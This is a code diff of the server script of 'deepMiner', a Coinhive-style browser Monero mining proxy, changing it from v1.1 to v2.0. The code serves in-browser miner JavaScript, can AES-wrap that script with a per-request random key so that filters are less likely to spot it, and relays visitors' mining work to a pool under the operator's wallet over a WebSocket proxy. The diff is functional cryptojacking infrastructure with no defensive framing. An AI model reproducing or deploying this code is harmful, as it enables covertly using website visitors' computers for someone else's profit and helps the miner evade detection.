@@ -1,22 +1,17 @@
 /**
- * deepMiner v1.1
+ * deepMiner v2.0
  * Idea from coinhive.com
- * Worker for any pool or personal wallet
+ * For any XMR pool with your wallet
  * By evil7@deePwn
- * improved by vphelipe
  */
+
 var http = require('http'),
-    https = require('https'),
     WebSocket = require("ws"),
     net = require('net'),
     fs = require('fs'),
-    crypto = require("crypto"),
-    CryptoJS = require(__dirname + '/crypto-js-3.1.9');
+    CryptoJS = require('crypto-js');
 
 var conf = JSON.parse(fs.readFileSync(__dirname + '/config.json', 'utf8'));
-
-//ssl support
-const ssl = !!(conf.key && conf.cert);
 
 //heroku global config
 conf.lport = process.env.PORT || conf.lport;
@@ -26,85 +21,65 @@ conf.addr = process.env.ADDR || conf.addr;
 
 // crypto for AES
 function rand(n) {
-    var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
+    var chars = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
     var res = "";
     for (var i = 0; i < n; i++) {
-        var id = Math.ceil(Math.random() * 35);
+        var id = Math.ceil(Math.random() * (chars.length - 1));
         res += chars[id];
     }
     return res;
 }
 
 function enAES(key, str) {
-    var encrypt = CryptoJS.AES.encrypt(str, CryptoJS.enc.Utf8.parse(key), {
-        mode: CryptoJS.mode.ECB,
-        padding: CryptoJS.pad.Pkcs7
-    });
+    var encrypt = CryptoJS.AES.encrypt(str, key);
     return encrypt.toString();
 }
 
 function deAES(key, str) {
-    var decrypt = CryptoJS.AES.decrypt(str, CryptoJS.enc.Utf8.parse(key), {
-        mode: CryptoJS.mode.ECB,
-        padding: CryptoJS.pad.Pkcs7
-    });
+    var decrypt = CryptoJS.AES.decrypt(str, key);
     return decrypt.toString(CryptoJS.enc.Utf8);
 }
 
-const stats = (req, res) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    req.url = (req.url === '/') ? '/index.html' : req.url;
-    fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
-        if (err) {
-            res.writeHead(301, {
-                'Location': 'https://' + conf.domain
-            });
-            res.end();
-        } else {
-            if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
-                buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
-                if (req.url.match(/\.js$/)) {
-                    var randKey = rand(32);
-                    tmp = fs.readFileSync(__dirname + '/tmpl.aes.min.js', 'utf8');
-                    tmp = tmp.replace(/%aes_file%/g, enAES(randKey, buf));
-                    tmp = tmp.replace(/%aes_key%/g, randKey);
-                    buf = fs.readFileSync(__dirname + '/crypto-js-3.1.9.min.js', 'utf8');
-                    buf += tmp;
-                    res.setHeader('content-type', 'application/javascript');
-                }
-            } else {
-                res.setHeader('Content-Type', 'application/octet-stream');
-            }
-            res.end(buf);
-        }
-    });
-}
+var file = file || {};
+file["/index.html"] = fs.readFileSync(__dirname + '/web/index.html', 'utf8').replace(/%deepMiner_domain%/g, conf.domain);
+file["/miner.html"] = fs.readFileSync(__dirname + '/web/miner.html', 'utf8').replace(/%deepMiner_domain%/g, conf.domain);
+file["/lib/deepMiner.min.js"] = fs.readFileSync(__dirname + '/web/lib/deepMiner.min.js', 'utf8').replace(/%deepMiner_domain%/g, conf.domain);
+file["/lib/worker-asmjs.min.js?v7"] = fs.readFileSync(__dirname + '/web/lib/cryptonight-asmjs.min.js', 'utf8').replace(/%deepMiner_domain%/g, conf.domain);
+file["/lib/worker-asmjs.min.js.mem"] = fs.readFileSync(__dirname + '/web/lib/cryptonight-asmjs.min.js.mem');
 
-//ssl support
-if (ssl) {
-    var web = https.createServer({
-        key: fs.readFileSync(conf.key),
-        cert: fs.readFileSync(conf.cert)
-    }, stats)
-} else {
-    var web = http.createServer(stats);
+var stats = (req, res) => {
+    req.url = (req.url === '/') ? '/index.html' : req.url;
+    if (req.url.match(/\.min\.js/)) {
+        if (req.url.match(/\.min\.js\?aes/)) {
+            res.setHeader('Access-Control-Allow-Origin', '*');
+            var randKey = rand(32);
+            file[req.url] = randKey + '|' + enAES(randKey, file[req.url.split('?')[0]]);
+        }
+        res.setHeader('content-type', 'application/javascript');
+    } else if (req.url.match(/\.html$/)) {
+        (req.url === '/index.html') ? res.setHeader('Content-Type', 'text/document') : res.setHeader('Content-Type', 'text/html');
+    } else {
+        res.setHeader('Content-Type', 'application/octet-stream');
+    }
+    res.end(file[req.url]);
 }
+var web = http.createServer(stats);
 
 // Miner Proxy Srv
 var srv = new WebSocket.Server({
     server: web,
-    path: "/api",
-    maxPayload: 256
+    path: "/proxy",
+    maxPayload: 1024
 });
 srv.on('connection', (ws) => {
     var conn = {
         uid: null,
-        pid: crypto.randomBytes(12).toString("hex"),
+        pid: rand(16).toString('hex'),
         workerId: null,
         found: 0,
         accepted: 0,
         ws: ws,
-        pl: new net.Socket(),
+        pl: new net.Socket()
     }
     var pool = conf.pool.split(':');
     conn.pl.connect(pool[1], pool[0]);
@@ -125,12 +100,14 @@ srv.on('connection', (ws) => {
                         "params": {
                             "login": conf.addr,
                             "pass": conf.pass,
+                            "rigid": "",
                             "agent": "deepMiner"
                         },
                         "id": conn.pid
                     }
                     buf = JSON.stringify(buf) + '\n';
                     conn.pl.write(buf);
+                    console.log(buf + '\n');
                     break;
                 }
             case 'submit':
@@ -191,16 +168,16 @@ srv.on('connection', (ws) => {
             if (data.id === conn.pid && data.error) {
                 if (data.error.code === -1) {
                     buf = {
-                        "type": "banned",
+                        "type": "error",
                         "params": {
-                            "banned": conn.pid
+                            "error": data.error.message
                         }
                     }
                 } else {
                     buf = {
-                        "type": "error",
+                        "type": "banned",
                         "params": {
-                            "error": data.error.message
+                            "banned": conn.pid
                         }
                     }
                 }
